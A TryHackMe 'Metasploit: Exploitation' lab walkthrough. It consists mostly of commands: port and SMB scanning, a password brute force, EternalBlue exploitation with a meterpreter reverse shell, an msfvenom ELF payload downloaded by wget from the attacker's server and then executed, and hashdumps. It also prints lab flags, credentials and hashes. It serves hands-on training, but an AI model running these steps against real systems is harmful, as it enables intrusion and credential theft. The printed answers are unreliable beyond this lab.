# THM - Metasploit: Exploitation

<br>

```shell
msfconsole
```

## Task 2

### Task 2.1

```shell
mkdir nmap
nmap -A -oN nmap/initial -p- 10.10.210.94
```

or:
```shell
(msfconsole:)
	search portscan
	use auxiliary/scanner/portscan/tcp
		show options
		set RHOSTS 10.10.210.94
		run
```

> 5

### Task 2.2

nmap or:
```shell
(msfconsole:)
		back
	search netbios
	use auxiliary/scanner/netbios/nbname
		show options
		set RHOSTS 10.10.210.94
		run
```

> ACME IT SUPPORT

### Task 2.3

nmap or:
```shell
(msfconsole:)
		back
	search http_version
	use auxiliary/scanner/http/http_version
		show options
		set RHOSTS 10.10.210.94
		set RPORT 8000
		run
```

> webfs/1.21

### Task 2.4

```shell
(msfconsole:)
		back
	search smb_login
	use auxiliary/scanner/smb/smb_login
		show options
		set RHOSTS 10.10.210.94
		set SMBUser penny
		set PASS_FILE ./MetasploitWordlist.txt
		run
```

> leo1234

<br>

## Task 4

### Task 4.1

```shell
(msfconsole:)
		back
	search SMTP type:auxiliary
	info auxiliary/scanner/smtp/smtp_relay
```

> Campbell Murray

<br>

## Task 5

```shell
nmap -A -oN nmap/initial2 -p- 10.10.167.139
```

ðŸ§° https://www.maketecheasier.com/find-open-files-using-command-prompt-windows/#:~:text=Searching%20for%20files%20and%20folders,of%20the%20name%20you%20remember.

```shell
(msfconsole:)
	search MS17-010
	use exploit/windows/smb/ms17_010_eternalblue
		show options
		set RHOSTS 10.10.167.139
		set LHOST 10.14.27.197
		show payloads
		set payload payload/windows/x64/meterpreter/reverse_tcp
		run
			
			shell
				dir "\flag.txt" /s
				type C:\Users\Jon\Documents\flag.txt
```

### Task 5.2

> THM-5455554845

### Task 5.3

```shell
(msfconsole:)	
			hashdump
```

> 8ce9a3ebd1647fcc5e04025019f4b875

<br>

## Task 6

```shell
ssh murphy@10.10.143.247
	yes
	1q2w3e4r
	sudo su
	1q2w3e4r
		whoami
```

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.14.27.197 LPORT=9876 -f elf > rev_shell.elf

python3 -m http.server 9000
```

```shell
(ssh:)
		wget http://10.14.27.197:9000/rev_shell.elf
		chmod +x rev_shell.elf
```

```shell
(python3:)
	^C

msfconsole
	use exploit/multi/handler
		show options
		set LHOST 10.14.27.197
		set LPORT 9876
		set payload linux/x86/meterpreter/reverse_tcp
		run
```

```shell
(ssh:)
		./rev_shell.elf
```

```shell
(msfconsole:)
			run post/linux/gather/hashdump
```

### Task 6.6

> $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0

<br>

